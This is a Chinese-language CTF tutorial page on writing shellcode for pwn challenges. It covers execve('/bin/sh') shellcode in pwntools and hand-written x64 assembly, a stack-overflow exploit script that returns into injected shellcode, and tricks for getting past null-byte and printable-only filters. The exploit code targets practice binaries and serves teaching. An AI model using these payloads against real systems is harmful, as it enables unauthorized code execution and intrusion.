---
title: Shellcode 编写基础
order: 3
icon: mdi:console-line
category:
  - CTF
  - 手册
  - Pwn
---

Shellcode 是一段直接以机器码形式执行的代码，通常用于在关闭 NX 保护时直接注入并执行。

## 什么时候用 Shellcode

```bash
checksec ./vuln
# NX: disabled  ← 栈可执行，可以注入 shellcode
# PIE: disabled ← 地址固定，方便定位
```

当 NX 关闭时，可以把 shellcode 写入栈或堆，然后跳转执行。

## 最简单的 Shellcode

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# pwntools 自动生成 shellcode
shellcode = asm(shellcraft.sh())
print(shellcode.hex())
# 等价于手写：execve("/bin/sh", NULL, NULL)
```

## 手写 x64 Shellcode

```asm
; execve("/bin/sh", NULL, NULL)
; syscall number: 59 (0x3b)
; rdi = "/bin/sh" 地址
; rsi = NULL
; rdx = NULL

xor rdx, rdx          ; rdx = 0
xor rsi, rsi          ; rsi = 0
lea rdi, [rip+binsh]  ; rdi = "/bin/sh" 地址
mov rax, 59           ; syscall: execve
syscall

binsh: .string "/bin/sh"
```

```python
# 用 pwntools 汇编
from pwn import *
context.arch = 'amd64'

shellcode = asm("""
    xor rdx, rdx
    xor rsi, rsi
    lea rdi, [rip+8]
    mov rax, 59
    syscall
    .string "/bin/sh"
""")
```

## 利用方式

### 栈上执行

```python
from pwn import *

context.arch = 'amd64'
p = process('./vuln')
elf = ELF('./vuln')

shellcode = asm(shellcraft.sh())

# 找到 buf 的地址（关闭 ASLR 时地址固定）
buf_addr = 0x7fffffffe000  # 实际调试确定

payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(buf_addr)  # 返回地址指向 shellcode

p.sendline(payload)
p.interactive()
```

### mmap 可执行内存

```python
# 如果栈不可执行，但有 mmap 调用
# 可以申请一块可执行内存，写入 shellcode 后跳转

shellcode = asm(shellcraft.sh())

# ROP 链：mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)
# 然后把 shellcode 写入，再跳转执行
```

## Shellcode 约束绕过

### 过滤了 \x00（空字节）

```python
# 用 xor 代替 mov 0
# 原：mov rax, 0
# 改：xor rax, rax

# 用 push/pop 代替含 \x00 的立即数
# 原：mov rdi, 0x68732f6e69622f  ← 可能含 \x00
# 改：
push 0x68732f2f
push 0x6e69622f
mov rdi, rsp
```

### 只允许可打印字符

某些题目要求 shellcode 全部是可打印 ASCII 字符（0x20-0x7e）：

```bash
# 使用 alpha3 工具生成全可打印 shellcode
python alpha3.py x64 ascii mixedcase rdi < shellcode.bin
```

### 长度限制

```python
# pwntools 提供了短 shellcode
shellcode = asm(shellcraft.linux.sh())  # 标准版
# 手动优化：去掉不必要的指令，用更短的等价指令
```

## 调试 Shellcode

```python
from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

# 把 shellcode 写成可执行文件测试
elf = ELF.from_bytes(shellcode)
# 或者用 run_shellcode
p = run_shellcode(shellcode)
p.interactive()
```

## 课后练习

- [写一段 shellcode](http://172.16.173.140/training/11?challenge=49) — 程序直接执行你的输入，需要写一段带字符过滤的 shellcode

## 练手资源

- CTFHub Pwn shellcode 系列
- [shell-storm.org](http://shell-storm.org/shellcode/) — shellcode 数据库
